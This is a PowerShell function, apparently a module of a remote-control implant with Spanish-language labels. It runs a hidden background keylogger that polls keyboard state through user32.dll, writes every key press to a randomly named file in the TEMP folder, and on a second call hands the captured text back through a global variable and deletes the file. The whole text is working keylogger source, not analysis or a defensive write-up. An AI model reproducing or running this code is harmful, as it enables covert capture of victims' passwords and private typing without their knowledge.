function keylogger{
    if($GLOBAL:joblist["keylogger"] -eq $nul -or $GLOBAL:joblist["keylogger"] -eq "")
    {
        $set = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
        $word = "\"
        $word += $set | Get-Random -Count 30
        $word = $word -replace(" ","")
        $word += ".txt"
        $ruta = $env:TEMP
        $ruta += $word

        $job = Start-Job -ArgumentList $ruta -ScriptBlock {
        $ruta = $args[0]
        # Signatures for API Calls
    $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

      # load signatures and make members available
      $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
      # create output file
      $null = New-Item -Path $ruta -ItemType File -Force

      try
      {
        # create endless loop. When user presses CTRL+C, finally-block
        # executes and shows the collected key presses
        while ($true) {
          Start-Sleep -Milliseconds 40
      
          # scan all ASCII codes above 8
          for ($ascii = 9; $ascii -le 254; $ascii++) {
            # get current key state
            $state = $API::GetAsyncKeyState($ascii)

            # is key pressed?
            if ($state -eq -32767) {
              $null = [console]::CapsLock

              # translate scan code to real code
              $virtualKey = $API::MapVirtualKey($ascii, 3)

              # get keyboard state for virtual keys
              $kbstate = New-Object Byte[] 256
              $checkkbstate = $API::GetKeyboardState($kbstate)

              # prepare a StringBuilder to receive input key
              $mychar = New-Object -TypeName System.Text.StringBuilder

              # translate virtual key
              $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

              if ($success) 
              {
                # add key to logger file
                [System.IO.File]::AppendAllText($ruta, $mychar, [System.Text.Encoding]::Unicode) 
              }
            }
          }
        }
      }
      finally
      {
        # open logger file in Notepad
        #notepad $Path
      }
    }    
        $GLOBAL:joblist["keylogger"]= $job
        $GLOBAL:joblist["keylog_path"]= $ruta
        $GLOBAL:execute = "Grabando"
    }
    else{
        $job = $Global:joblist["keylogger"]
        Stop-Job -Job $job
        $ruta = $GLOBAL:joblist["keylog_path"]
        $GLOBAL:execute = gc $ruta
        $GLOBAL:execute
        rm $ruta
        $Global:joblist["keylogger"]= ""
        $GLOBAL:joblist["keylog_path"]= ""
    }
}
